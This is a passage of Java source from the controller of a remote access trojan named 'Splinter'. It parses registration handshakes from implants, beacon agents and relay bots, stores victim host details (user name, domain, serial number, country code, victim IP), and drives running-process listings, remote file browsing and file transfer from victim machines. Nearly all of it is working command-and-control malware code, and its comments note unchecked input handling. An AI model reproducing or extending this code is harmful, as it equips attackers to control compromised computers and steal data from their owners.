			 * LOGG THE RECEIVED LINE
			 ******************************/
			
			//all lines received are from the connected agent sending feedback to the controller
			//try	{	Driver.logReceivedLine(true, this.getId(), " " + this.myRandomIdentifier + " ", " " + myImplantName + " ", " SPLINTER - CONTROLER ", " " + this.myVictim_RHOST_IP + " ", " " + Thread_ServerSocket.ControllerIP + " ", line);	} catch(Exception ee){}
			
			/*****************************************************************************
			 * 
			 * LOGGING AGENT
			 * 
			 *****************************************************************************/
			if(line.trim().startsWith(Driver.LOGGIE_AGENT_REGISTRATION))
			{
				String handShake = line.replace(Driver.LOGGIE_AGENT_REGISTRATION, "");
				storeHandShakeData(handShake);
				
				this.i_am_loggie_agent = true;
				
				this.myIMPLANT_ID = Driver.IMPLANT_ID_LOGGIE;
				try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
				
				Drivers.sop("===}}} Sweet! Looks like we have a " + myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this logging agent");		          		
				
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//send rand number back to implant as ACK
				this.sendCommand_RAW("" + myRandomIdentifier);
				
				return true;				
				
			}
				
			/*****************************************************************
			 * PAYLOAD MIGRATION
			 *****************************************************************/
			else if(line != null && line.trim().startsWith(""+Driver.SERVICE_REQUEST_I_AM_SENDING_THIS_FILE))
			{
				try
				{
					return Driver.initialize_file_receiver(line.split(Driver.delimeter_1), null, this);
				}
				catch(Exception e)
				{
					Driver.sop("Could not initialize file receiver!!!");
				}
			}
			
			/*****************************************************************************
			 * 
			 * BEACON AGENT PROVIDING A RESPONSE
			 * 
			 *****************************************************************************/
			else if(this.i_am_Beacon_Agent && this.i_am_receiving_beacon_response)
			{
				//test to ensure if it is time to close the socket
				if(line.trim().equals(Driver.SPLINTER_BEACON_END_DATA_TRANSFER))
				{
					this.closeThread();
					return true;
				}
				
				//test if we're receiving a new beacon request
				else if(line.trim().startsWith(Driver.REQUEST_BEACON_COMMAND_LIST))
				{
					i_am_receiving_beacon_response = false;
					return determineCommand(line);
				}
				
				//test if we're receiving handshake data
				else if(line.startsWith(Driver.HANDSHAKE))
				{
					//i_am_receiving_beacon_response = false;
					
					String handShake = line.replace(Driver.HANDSHAKE, "");
					storeHandShakeData(handShake);
					
					this.myIMPLANT_ID = Driver.IMPLANT_ID_BEACON;
					try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
					
					return true;
				}
				
				//otherwise, post the response to the controller window
				Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
				
				return true;
			}
			
			/*****************************************************************************
			 * 
			 * 
			 * SPLINTER - CONTROLLER
			 * 
			 * 
			 *****************************************************************************/			
			else if(line.trim().startsWith(Driver.CONTROLLER_INITIAL_REGISTRATION) && !i_have_associated_with_controller)
			{
				//HANDSHAKE WITH SPLINTER CONTROLLER!
				
				//LABEL THE IMPLANT
				this.myIMPLANT_ID = Driver.IMPLANT_ID_SPLINTER_CONTROLLER;
				this.myImplantName = Driver.controller_type; 
				this.i_am_Controller_Agent = true;
		
				Drivers.sop("-->>>> Yeah Man! Looks like we have a " + myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this controller");		          		
				
				/**
				 * NOTE: THIS IS A POTENTIAL BUFFER OVERFLOW LOCATION... I DON'T CHECK WHAT IS PROVIDED FROM THE USER, I JUST READ EVERYTHING!
				 */
				
				connectedAgentHandshake_BackwardLink_Relay = line;
				
				//REMOVE THE HEADER DATA
				try{	line = line.replace(Driver.CONTROLLER_INITIAL_REGISTRATION, ""); }catch(Exception e){}
				
				
								
				//split the input received
				String [] arrAgent = line.split(Driver.delimeter_1);
				
				if(arrAgent == null || arrAgent.length < 2)
				{
					Driver.sop("Invalid handshake received! Unable to determine agent connection type");
					Driver.sop("received line: " + line);
					return false;
				}
				
				//Save the Data Just Received!
				this.myImplantInitialLaunchDirectory = arrAgent[0]; 
				this.myHostName = arrAgent[1]; 
				this.myOS = arrAgent[2]; 
				this.myOS_Type = arrAgent[3]; 
				this.myUserName = arrAgent[4]; 
				this.myUserDomain = arrAgent[5]; 
				this.myTempPath = arrAgent[6]; 
				this.myUserProfile = arrAgent[7]; 
				this.myProcessorArchitecture = arrAgent[8]; 
				this.myNumberOfProcessors = arrAgent[9]; 
				this.mySystemRoot = arrAgent[10]; 
				
				this.myServicePack = arrAgent[11]; 
				this.myNumberOfUsers = arrAgent[12]; 
				this.mySerialNumber = arrAgent[13];
				this.myOS_Architecture = arrAgent[14];     
				this.myCountryCode = arrAgent[15];       
				this.myVersionNumber = arrAgent[16]; 
				this.myHomeDrive = arrAgent[17]; 				
												
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				//this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//save my unique identifier now
				//this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + myRandomIdentifier + "]";
				
				//Send Controller's info back as well
				if(this.i_am_setup_as_relay)
				{
					//so all of the above is the handshake of the connecting controller, 
					//this relay now needs to send back it's handshake to the controller
					
					if(this.relay_mode_BRIDGE)
					{
						
						
						this.sendCommand_RAW(Driver.RELAY_INITIAL_REGISTRATION_BRIDGE + Driver.getHandshakeData(Driver.delimeter_1));
					}
					
					else if(this.relay_mode_PROXY)
					{
						
						
						this.sendCommand_RAW(Driver.RELAY_INITIAL_REGISTRATION_PROXY + Driver.getHandshakeData(Driver.delimeter_1));
					}
					
				}				
				else
				{
					this.sendCommand_RAW(Driver.CONTROLLER_INITIAL_REGISTRATION + Driver.getHandshakeData(Driver.delimeter_1));
				}
				
				
				
				i_have_associated_with_controller = true;
				
				return true;
			}
			
			/*****************************************************************************
			 * 
			 * 
			 * SPLINTER - BEACON RESPONDING TO COMMAND
			 * 
			 * 
			 ****************************************************************************/
			else if(line.startsWith(Driver.SPLINTER_BEACON_RESPONSE_HEADER))
			{
				Driver.sop("Splinter BEACON Response preamble received. Commencing data input...");	  			
				
				//get the confirmation ID
				myReceivedConfirmationID_From_Implant = line.replace(Driver.SPLINTER_BEACON_RESPONSE_HEADER, "");
				
				//get the thread and update it's connection time
				updateBeaconConnectionTime(myReceivedConfirmationID_From_Implant);
				
				/*Thread_Terminal beaconThread = Driver.getBeaconThread(myReceivedConfirmationID_From_Implant);
				
				if(beaconThread != null)
				{
					beaconThread.updateBeaconConnectionTime();
				}*/
				
				return true;
			}
			
			/*****************************************************************************
			 * 
			 * 
			 * SPLINTER - BEACON IMPLANT INITIAL REGISTRATION
			 * 
			 * 
			 ****************************************************************************/
			else if(line.startsWith(Driver.SPLINTER_BEACON_INITIAL_REGISTRATION))
			{
				//HANDSHAKE WITH SPLINTER BEACON!
				
				//LABEL THE IMPLANT
				this.myIMPLANT_ID = Driver.IMPLANT_ID_BEACON;
				try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
				i_am_Beacon_Agent = true;
//			
				Drivers.sop("<<<<< -- >>>>> Ooooohhh Joy! Looks like we have a " + myImplantName + " connected!  <<<<< -- >>>>> confidence: 100%.  Setting up the environment to handle this type of implant");		          		
				
				/**
				 * NOTE: THIS IS A POTENTIAL BUFFER OVERFLOW LOCATION... I DON'T CHECK WHAT IS PROVIDED FROM THE USER, I JUST READ EVERYTHING!
				 */
				
				connectedAgentHandshake_BackwardLink_Relay = line;
				
				//REMOVE THE HEADER DATA
				try{	line = line.replace(Driver.SPLINTER_BEACON_INITIAL_REGISTRATION, ""); }catch(Exception e){}
								
				
				
				//split the input received
				String [] arrAgent = line.split(Driver.delimeter_1);
				
				//Save the Data Just Received!
				this.myImplantInitialLaunchDirectory = arrAgent[0]; 
				this.myHostName = arrAgent[1]; 
				this.myOS = arrAgent[2]; 
				this.myOS_Type = arrAgent[3]; 
				this.myUserName = arrAgent[4]; 
				this.myUserDomain = arrAgent[5]; 
				this.myTempPath = arrAgent[6]; 
				this.myUserProfile = arrAgent[7]; 
				this.myProcessorArchitecture = arrAgent[8]; 
				this.myNumberOfProcessors = arrAgent[9]; 
				this.mySystemRoot = arrAgent[10]; 
				
				this.myServicePack = arrAgent[11]; 
				this.myNumberOfUsers = arrAgent[12]; 
				this.mySerialNumber = arrAgent[13];
				this.myOS_Architecture = arrAgent[14];     
				this.myCountryCode = arrAgent[15];       
				this.myVersionNumber = arrAgent[16]; 
				this.myHomeDrive = arrAgent[17]; 				
												
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//save my unique identifier now
				this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + myRandomIdentifier + "]";
				
				//send rand number back to implant as ACK
				this.sendCommand_RAW("" + myRandomIdentifier);
				
				myConfirmationID_Beacon = ""+myRandomIdentifier;
				
				/*Thread_Terminal terminal = Driver.getBeaconThread(myConfirmationID_Beacon);
				if(terminal == null)
				{
					Driver.alBeaconTerminals.add(this);
					Drivers.jtblBeaconImplants.updateJTable = true;
				}*/

				
				if(Driver.instance_loaded_CONTROLLER)
				{
					//
					//Send beacon confirmation to store it's registration value
					//
					this.sendCommand_RAW(Driver.SET_IMPLANT_REGISTRATION + Driver.delimeter_1 + this.myRandomIdentifier);
				}
				
				//
				//RELAY BOT?
				//
				//at this point, we need to determine if we're a relay bot and the relay mode: proxy or bridge
				//if proxy, establish persistent connection to forward Controller
				//if bridge, update all connected clients to entry of new client
				
				if(this.i_am_setup_as_relay && this.relay_mode_PROXY)
				{
					if(line != null && !line.startsWith(Driver.SPLINTER_BEACON_INITIAL_REGISTRATION))
					{
						relayMessage_PROXY_FORWARD_LINK(connectedAgentHandshake_BackwardLink_Relay);
					}
					else
					{
						relayMessage_PROXY_FORWARD_LINK(connectedAgentHandshake_BackwardLink_Relay);
					}
				}
				
				
				return true;
				
			}
			
			/*****************************************************************************
			 * 
			 * 
			 * SPLINTER - IMPLANT
			 * 
			 * 
			 ****************************************************************************/
			else if(line.startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION))
			{
				//HANDSHAKE WITH SPLINTER IMPLANT!
				
				//LABEL THE IMPLANT
				this.myIMPLANT_ID = Driver.IMPLANT_ID_SPLINTER_IMPLANT;
				try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
				i_am_Splinter_RAT = true;
//Drivers.sop(line);			
				Drivers.sop("-->>>> Ooooohhh Joy! Looks like we have a " + myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this type of implant");		          		
				
				/**
				 * NOTE: THIS IS A POTENTIAL BUFFER OVERFLOW LOCATION... I DON'T CHECK WHAT IS PROVIDED FROM THE USER, I JUST READ EVERYTHING!
				 */
				
				connectedAgentHandshake_BackwardLink_Relay = line;
				
				//REMOVE THE HEADER DATA
				try{	line = line.replace(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION, ""); }catch(Exception e){}
								
				
				
				//split the input received
				String [] arrAgent = line.split(Driver.delimeter_1);
				
				//Save the Data Just Received!
				this.myImplantInitialLaunchDirectory = arrAgent[0]; 
				this.myHostName = arrAgent[1]; 
				this.myOS = arrAgent[2]; 
				this.myOS_Type = arrAgent[3]; 
				this.myUserName = arrAgent[4]; 
				this.myUserDomain = arrAgent[5]; 
				this.myTempPath = arrAgent[6]; 
				this.myUserProfile = arrAgent[7]; 
				this.myProcessorArchitecture = arrAgent[8]; 
				this.myNumberOfProcessors = arrAgent[9]; 
				this.mySystemRoot = arrAgent[10]; 
				
				this.myServicePack = arrAgent[11]; 
				this.myNumberOfUsers = arrAgent[12]; 
				this.mySerialNumber = arrAgent[13];
				this.myOS_Architecture = arrAgent[14];     
				this.myCountryCode = arrAgent[15];       
				this.myVersionNumber = arrAgent[16]; 
				this.myHomeDrive = arrAgent[17]; 				
												
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//save my unique identifier now
				this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + myRandomIdentifier + "]";
				
				//send rand number back to implant as ACK
				this.sendCommand_RAW("" + myRandomIdentifier);
				
				
				//
				//RELAY BOT?
				//
				//at this point, we need to determine if we're a relay bot and the relay mode: proxy or bridge
				//if proxy, establish persistent connection to forward Controller
				//if bridge, update all connected clients to entry of new client
				
				if(this.i_am_setup_as_relay && this.relay_mode_PROXY)
				{
					if(line != null && !line.startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION))
					{
						relayMessage_PROXY_FORWARD_LINK(connectedAgentHandshake_BackwardLink_Relay);
					}
					else
					{
						relayMessage_PROXY_FORWARD_LINK(connectedAgentHandshake_BackwardLink_Relay);
					}
				}
				
				
				
				
			}
			
			/*****************************************************************************
			 * 
			 * 
			 * RELAY BRIDGE
			 * 
			 * 
			 *****************************************************************************/			
			else if(line.trim().startsWith(Driver.RELAY_INITIAL_REGISTRATION_BRIDGE) && !i_have_associated_with_controller)
			{
				//HANDSHAKE WITH SPLINTER CONTROLLER!
				
				//LABEL THE IMPLANT
				this.myIMPLANT_ID = Driver.IMPLANT_ID_RELAY_BRIDGE;
				this.myImplantName = Driver.relay_bridge_type; 
				this.i_am_Relay_Agent = true;
		
				Drivers.sop("-->>>> * * * Yeah Man!!! Looks like we have a " + myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this controller");		          		
				
				/**
				 * NOTE: THIS IS A POTENTIAL BUFFER OVERFLOW LOCATION... I DON'T CHECK WHAT IS PROVIDED FROM THE USER, I JUST READ EVERYTHING!
				 */
				
				connectedAgentHandshake_BackwardLink_Relay = line;
				
				//Driver.sop(line);
				
				//REMOVE THE HEADER DATA
				try{	line = line.replace(Driver.RELAY_INITIAL_REGISTRATION_BRIDGE, ""); }catch(Exception e){}
				
				
								
				//split the input received
				String [] arrAgent = line.split(Driver.delimeter_1);
				
				if(arrAgent == null || arrAgent.length < 2)
				{
					Driver.sop("Invalid handshake received! Unable to determine agent connection type");
					Driver.sop("received line: " + line);
					return false;
				}
				
				//Save the Data Just Received!
				this.myImplantInitialLaunchDirectory = arrAgent[0]; 
				this.myHostName = arrAgent[1]; 
				this.myOS = arrAgent[2]; 
				this.myOS_Type = arrAgent[3]; 
				this.myUserName = arrAgent[4]; 
				this.myUserDomain = arrAgent[5]; 
				this.myTempPath = arrAgent[6]; 
				this.myUserProfile = arrAgent[7]; 
				this.myProcessorArchitecture = arrAgent[8]; 
				this.myNumberOfProcessors = arrAgent[9]; 
				this.mySystemRoot = arrAgent[10]; 
				
				this.myServicePack = arrAgent[11]; 
				this.myNumberOfUsers = arrAgent[12]; 
				this.mySerialNumber = arrAgent[13];
				this.myOS_Architecture = arrAgent[14];     
				this.myCountryCode = arrAgent[15];       
				this.myVersionNumber = arrAgent[16]; 
				this.myHomeDrive = arrAgent[17]; 				
												
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				//this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//save my unique identifier now
				//this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + myRandomIdentifier + "]";
				
				//Send Controller's info back as well
				if(this.i_am_setup_as_relay)
				{
					
					if(this.relay_mode_BRIDGE)
					{
						this.sendCommand_RAW(Driver.RELAY_INITIAL_REGISTRATION_BRIDGE + Driver.getHandshakeData(Driver.delimeter_1));
					}
					
					else if(this.relay_mode_PROXY)
					{
						this.sendCommand_RAW(Driver.RELAY_INITIAL_REGISTRATION_PROXY + Driver.getHandshakeData(Driver.delimeter_1));
					}
					
				}				
				else
				{
					this.sendCommand_RAW(Driver.CONTROLLER_INITIAL_REGISTRATION + Driver.getHandshakeData(Driver.delimeter_1));
				}
				
				
				
				i_have_associated_with_controller = true;
				
				return true;
			}
			
			
			/*****************************************************************************
			 * 
			 * 
			 * RELAY PROXY
			 * 
			 * 
			 *****************************************************************************/			
			else if(line.trim().startsWith(Driver.RELAY_INITIAL_REGISTRATION_PROXY) && !i_have_associated_with_controller)
			{
				//HANDSHAKE WITH SPLINTER CONTROLLER!
				
				//LABEL THE IMPLANT
				this.myIMPLANT_ID = Driver.IMPLANT_ID_RELAY_PROXY;
				this.myImplantName = Driver.relay_proxy_type; 
				this.i_am_Relay_Agent = true;
		
				Drivers.sop("-->>>> * * Yeah Man!! Looks like we have a " + myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this controller");		          		
				
				/**
				 * NOTE: THIS IS A POTENTIAL BUFFER OVERFLOW LOCATION... I DON'T CHECK WHAT IS PROVIDED FROM THE USER, I JUST READ EVERYTHING!
				 */
				
				connectedAgentHandshake_BackwardLink_Relay = line;
												
				//REMOVE THE HEADER DATA
				try{	line = line.replace(Driver.RELAY_INITIAL_REGISTRATION_PROXY, ""); }catch(Exception e){}
				
				
								
				//split the input received
				String [] arrAgent = line.split(Driver.delimeter_1);
				
				if(arrAgent == null || arrAgent.length < 2)
				{
					Driver.sop("Invalid handshake received! Unable to determine agent connection type");
					Driver.sop("received line: " + line);
					return false;
				}
				
				//Save the Data Just Received!
				this.myImplantInitialLaunchDirectory = arrAgent[0]; 
				this.myHostName = arrAgent[1]; 
				this.myOS = arrAgent[2]; 
				this.myOS_Type = arrAgent[3]; 
				this.myUserName = arrAgent[4]; 
				this.myUserDomain = arrAgent[5]; 
				this.myTempPath = arrAgent[6]; 
				this.myUserProfile = arrAgent[7]; 
				this.myProcessorArchitecture = arrAgent[8]; 
				this.myNumberOfProcessors = arrAgent[9]; 
				this.mySystemRoot = arrAgent[10]; 
				
				this.myServicePack = arrAgent[11]; 
				this.myNumberOfUsers = arrAgent[12]; 
				this.mySerialNumber = arrAgent[13];
				this.myOS_Architecture = arrAgent[14];     
				this.myCountryCode = arrAgent[15];       
				this.myVersionNumber = arrAgent[16]; 
				this.myHomeDrive = arrAgent[17]; 				
												
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				//this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//save my unique identifier now
				//this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + myRandomIdentifier + "]";
				
				//get my unique random identifier for this thread and send the unique random number back as an ACK. The implant will use this now to uniquely ask questions from the controller
				this.myRandomIdentifier = Driver.getUniqueRandomNumber();
				
				//save my unique identifier now
				this.myUniqueDelimiter = Driver.SPLINTER_DELIMETER_OPEN + myRandomIdentifier + "]";
				
				//send rand number back to implant as ACK
				this.sendCommand_RAW("" + myRandomIdentifier);
				
				try
				{
					Drivers.appendRelayMessageCommandTerminal("NEW AGENT HAS JOINED THE RELAY: --->>> [ " + myUserName + " @ " + myVictim_RHOST_IP + " - " + myHostName + " ]");
					this.myCareOfAddress = myVictim_RHOST_IP;					
				}
				catch(Exception e)
				{
					Drivers.appendRelayMessageCommandTerminal("NEW AGENT HAS JOINED THE RELAY!!!");
				}
				
				
				
				
				//Send Controller's info back as well
				if(this.i_am_setup_as_relay)
				{
					
					if(this.relay_mode_BRIDGE)
					{
						this.sendCommand_RAW(Driver.RELAY_INITIAL_REGISTRATION_BRIDGE + Driver.getHandshakeData(Driver.delimeter_1));
					}
					
					else if(this.relay_mode_PROXY)
					{
						this.sendCommand_RAW(Driver.RELAY_INITIAL_REGISTRATION_PROXY + Driver.getHandshakeData(Driver.delimeter_1));
					}
					
				}				
				else
				{
					this.sendCommand_RAW(Driver.CONTROLLER_INITIAL_REGISTRATION + Driver.getHandshakeData(Driver.delimeter_1));
				}
				
				
				
				i_have_associated_with_controller = true;
				
				return true;
			}
			
			/********************************************************************************************
			 * 
			 * 
			 * 
			 * RELAY THE MESSAGE ON!
			 * 
			 * 
			 * 
			 * 
			 ********************************************************************************************/
			else if(i_am_setup_as_relay && relay_mode_BRIDGE)
			{
				relayMessage_BRIDGE(line);
				
				
				return true;
			}
			
			else if(i_am_setup_as_relay && relay_mode_PROXY)
			{
				relayMessage_PROXY_FORWARD_LINK(line);
				
				return true;
			}

			/********************************************************************************************
			 * 
			 * 
			 * 
			 * RELAY ECHOED MESSAGE
			 * 
			 * 
			 * 
			 * 
			 ********************************************************************************************/
			else if(line.trim().startsWith(Driver.RELAY_ECHO))
			{
				
				String [] arrCmd = line.split(Driver.delimeter_1);
				try
				{
					
					//check if we have a new controller joining the bridge
					if(arrCmd[4].startsWith(Driver.CONTROLLER_INITIAL_REGISTRATION))
					{
						Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+myThread_ID, "NEW CONTROLLER HAS JOINED THE BRIDGE: ---->>> [ " + arrCmd[8] + " @ " + arrCmd[3] +  " - " + arrCmd[5] + "] "+ "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());						
					}
					else//normal relayed msg, display it in the terminal					
					{
						Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+myThread_ID, "RELAYED COMMAND [ " + arrCmd[1] + " @ " + arrCmd[3] + "] --> " + arrCmd[4] + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
					}
				}catch(Exception e)
				{
					Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+myThread_ID, "RELAYED COMMAND RECEIVED: [" + line  + "]" + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
				}
				
				return true;
			}
			
			
			
			
			
			/********************************************************************************************
			 * 
			 * 
			 * 
			 * HANDLE CONTROLLER COMMANDS SEPARATELY
			 * 
			 * 
			 * 
			 * 
			 ********************************************************************************************/
			
			if(i_am_Controller_Agent)
			{
				if(line.trim().startsWith(Driver.CHAT_MESSAGE_BROADCAST))
				{
					// [0] == CHAT_MESSAGE_BROADCAST
					// [1] == [private or public broadcast]
					// [2] == [chat message]
					// [3] == screen name
					
					String []arrcmd = line.split(Driver.delimeter_1);
					privateChatMsg = false;
					if(arrcmd[1].equalsIgnoreCase(Driver.FLAG_PRIVATE))
					{
						privateChatMsg = true;
					}
					
					if(!arrcmd[3].trim().equals(myChatScreenName))
					{
						//simply check if we need to update the screen name
						if(this.i_am_setup_as_relay)
						{
							//not sure what i want to do here just yet
						}
						else//otw, update connected agents as before				
						{
							Drivers.updateConnectedImplants();
							//Drivers.jtblConnectedImplants.updateJTable = true;
						}
					}
					
					this.myChatScreenName = arrcmd[3];
					
					//post the message
					Drivers.txtpne_mainChatBoard.appendString(true, privateChatMsg, this.getChatScreenName(), "", arrcmd[2], Drivers.clrBackground, Drivers.clrImplant, Drivers.clrController);
					
				}
				
				return true;
			}
			
			
			/********************************************************************************************
			 * 
			 * BEACON AGENT REQUESTING COMMAND LIST
			 * 
			 ********************************************************************************************/
			else if(line.startsWith(Driver.REQUEST_BEACON_COMMAND_LIST))
			{
				//format: REQUEST %%%%% CONFIRMATION ##### HANDSHAKE DATA
				
				//so take the handshake data first
				String [] data = line.split(Driver.delimeter_2);
				
				//[0] == request%%%%%confirmation 
				//[1] == handshake
				
				storeHandShakeData(data[1]);	
				
				this.myIMPLANT_ID = Driver.IMPLANT_ID_BEACON;
				try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
				
				processBeaconCheckin(data[0]);
				return true;
			}
			
			
			else if(line.startsWith(this.myUniqueDelimiter) || line.startsWith(Driver.SPLINTER_DELIMETER_OPEN))
			{
				
				try//if the below fails at any point, simply display what we received to the terminal
				{
					//first, ensure we did not receive the initial heading line that has "Image Name,PID,Session Name,Session#,Mem Usage,Status,User Name,CPU Time,Window Title" in it
					if(line.contains("Image Name,PID,Session Name,Session#,Mem Usage,Status,User Name,CPU Time,Window Title"))
					{
						return true;//don't store this initial line
					}
					
					//we know this is a special response from the agent, parse the line to know how to respond to the input
					String []arrcmd = line.split(Driver.delimeter_1);
					
					//[0] == myUniqueDelimeter == [SPLINTER@<randNumber>]
					//[1] == special command
					
					/*if(closingRunningProcessFrame)
					{
						//reject showing this frame
						closingRunningProcessFrame = false;
						return true;
					}*/
					/***********************************************************************
					 * 
					 * 
					 * RUNNING PROCESS LIST
					 * 
					 * This is the expected procedure: 
					 * -->Receive BEGIN_RUNNING_PS: 
					 * 		-start a new Process frame (if one is not already initialized)
					 * 		-clear the new process list of the ProcessFrame
					 * -->Receive DATA_RUNNING_PS
					 * 		-add the new process to the alNewProcess list in the process frame
					 * -->Receive END_DATA_RUNNING_PS	
					 * 		-save alNewProcessList to alCurrentProcessList
					 * 		-set bool flag to true for JTable to clear and refresh the JTable
					 ***********************************************************************/
					
					if(arrcmd[1].equals(Driver.BEGIN_RUNNING_PROCESS_LIST))
					{
								
						/**
						 * CHECK TO DISMISS THE UPDATE!
						 */
						if(pauseRunningProcessUpdate)
						{
							return true;
						}
						
						//display the new frame
						if(this.runningProcessFrame == null || !runningProcessFrame.isShowing() || !runningProcessFrame.isDisplayable())
						{															
							this.runningProcessFrame = new Frame_RunningProcessList(JPanel_MainControllerWindow.INDEX_THIS_IS_RUNNING_PROCESS_,  this);
							runningProcessFrame.setVisible(true);
							
							runningProcessFrame.processInterrupt_RefreshJTable = false;
							
						}
						
						try{	runningProcessFrame.alNewProcesses.clear();}catch(Exception e){}
						
						return true;
					}
					
					else if(arrcmd[1].equals(Driver.DATA_RUNNING_PROCESS_LIST))
					{
						
						/**
						 * CHECK TO DISMISS THE UPDATE!
						 */
						if(pauseRunningProcessUpdate)
						{
							return true;
						}
						
						
						try
						{
							String s = arrcmd[2];
						}catch(Exception e){return true;}//simply exit out if an empty line is returned
						
						if(frameRunningProcessIsDisposed)
						{
							return true;//do nothing if user chose to close the frame
							//otherwise, uncomment out the comment block below to be as before
						}
						
				/*if(this.runningProcessFrame == null || !runningProcessFrame.isShowing() || !runningProcessFrame.isDisplayable())
				{															
					this.runningProcessFrame = new Frame_RunningProcessList(JPanel_MainControllerWindow.INDEX_THIS_IS_RUNNING_PROCESS_,  this);
					runningProcessFrame.setVisible(true);							
				}*/
						
						//strTmpPS = strTmpPS + arrcmd[2] + "\n";
						
//runningProcessFrame.jpnlTerminal.txtpne_broadcastMessages.appendString(false, "", arrcmd[2], Drivers.clrImplant, Drivers.clrBackground);
						
						//NOTE: WE ARE RUNNING THE proc = Runtime.getRuntime().exec("cmd /c " + "tasklist /v /fo csv"); COMMAND ON THE BOX
						//HOWEVER, WE ARE ALSO GOING TO NORMALIZE THE INPUTS RECEIVD FROM THE CLIENT
						//IT'S NOT THE MOST ELEGANT, BECAUSE WE ARE NOW TRUSING MORE DATA FROM THE CLIENT. BUT MEH, IT'LL DO
						
						//split the line that came back as a CSV into a vector
						try
						{
							String [] processData = arrcmd[2].split(",");
							//(ImageName, procID, SessionName, SessionNumer, MemUsage, Status, UserName, CpuTime, WindowTitle)
							
							//note!!! sometimes, a process can have 2,102K mem assigned to it, however, the csv will confuse the 2. therefore check the size of the array, if it is of size 9, then it is ok as normal, but if it is of size 10, then we'll have to combine the extra index 
							if(processData.length == 10)
							{
								ndeRunningProcess = new Node_RunningProcess(processData[0], Long.parseLong(processData[1]),processData[2], processData[3], processData[4] + "," + processData[5], processData[6], processData[7], processData[8], processData[9]);
							}
							else							
							{
								ndeRunningProcess = new Node_RunningProcess(processData[0], Long.parseLong(processData[1]),processData[2], processData[3], processData[4], processData[5], processData[6], processData[7], processData[8]);
							}
							
							//"Link" the running process node
							runningProcessFrame.alNewProcesses.add(ndeRunningProcess);
						}
						catch(Exception e)
						{
							Driver.sop("Invalid line received from Thread [" + this.myThread_ID + "]: " + line);							
						}
						
						return true;
					}
					
					else if(arrcmd[1].equals(Driver.END_RUNNING_PROCESS_LIST))
					{
						/**
						 * CHECK TO DISMISS THE UPDATE!
						 */
						if(pauseRunningProcessUpdate)
						{
							return true;
						}
						
						
						//swap the newly populated arraylist into the currently displayed arraylist
						runningProcessFrame.alCurrentDisplayedProcesses = runningProcessFrame.alNewProcesses;
						
						//indicate the frame is to interrupt and handle refreshing the jtable
						runningProcessFrame.processInterrupt_RefreshJTable = true;
						
						return true;
					}
					
					/***********************************************************************
					 * 
					 * 
					 * FILE BROWSER OF REMOTE VICTIM SYSTEM
					 * 
					 * * * * POTENTIAL BUFFER OVERFLOW * * * i don't do any validation on input or how much we receive!
					 * 
					 * This is the expected procedure: 
					 *  --->> BEGIN_FILE_BROWSER_FILE_ROOTS: marks the beginning of a new file root system, upon receiving this, remove all entries in the new arraylist, and store the new system in the following received lines
					 * ---->> FILE_BROWSER_FILE_ROOTS: marks a new file root coming in, break off the demiter, create a new file object node, and store in alNewFileRoot
					 * ---->> END_FILE_BROWSER_FILE_ROOTS: this states we have finished reading the File roots, convert the new arraylist over to current arraylist, and display the frame
					 * 
					 * 
					 * 
					 * 
					 * 
					 * 
					 *************************************************************************/
					
					//
					//BEGIN FILE ROOTS
					//
					else if(arrcmd[1].equals(Driver.BEGIN_FILE_BROWSER_FILE_ROOTS))
					{
						if(this.myFileBrowser != null)	{	try	{myFileBrowser.dispose();}catch(Exception e){}	}
						
						this.myFileBrowser =  new Frame_FileBrowser(this);
						//wait to display the frame until we receive the end of file roots signal. otherwise, we don't show the frame
						
						try{	myFileBrowser.alNewFileRoots.clear();}catch(Exception e){}
						try{	myFileBrowser.alNewFileList.clear();}catch(Exception e){}
						
						
